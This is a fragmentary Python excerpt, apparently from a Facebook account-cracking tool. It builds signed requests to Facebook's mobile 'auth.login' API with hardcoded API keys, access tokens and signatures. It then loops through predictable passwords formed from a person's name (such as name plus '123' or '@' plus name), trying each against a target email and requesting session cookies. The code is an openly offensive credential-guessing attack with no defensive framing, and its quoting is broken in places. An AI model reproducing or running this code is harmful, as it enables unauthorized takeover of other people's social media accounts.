...
def     get(email,pasw):
	...
	try:
		sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+email+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pasw+'return_ssl_resources":"0","v":"1.0"
		...
		exit("%s[X] %scheck your connection !!"%(R,W))
...
def x(user):
	...
	try:
		...
		for pas in [nama+"01",nama+"123",nama+"000",nama+"12345","@"+nama,]:
			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=1302824299894917%de61215fbf16df9eb522f9244e770f11&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
